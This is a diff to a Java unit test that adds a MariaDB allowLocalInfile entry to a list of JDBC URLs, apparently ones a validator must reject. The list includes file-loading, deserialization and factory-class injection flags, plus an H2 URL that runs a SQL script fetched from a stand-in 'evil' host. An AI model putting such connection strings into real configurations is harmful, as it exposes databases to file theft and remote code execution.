@@ -124,6 +124,7 @@ class JdbcUrlTest {
     @ValueSource(strings = {
         "jdbc:mysql://db/erp?allowLoadLocalInfile=true",
         "jdbc:mariadb://db/erp?user=a&autoDeserialize=true",
+        "jdbc:mariadb://db/erp?allowLocalInfile=true",
         "jdbc:postgresql://db/erp?socketFactory=x.Y",
         "jdbc:postgresql://db/erp?sslfactory=x.Y",
         "jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://evil/x.sql'",
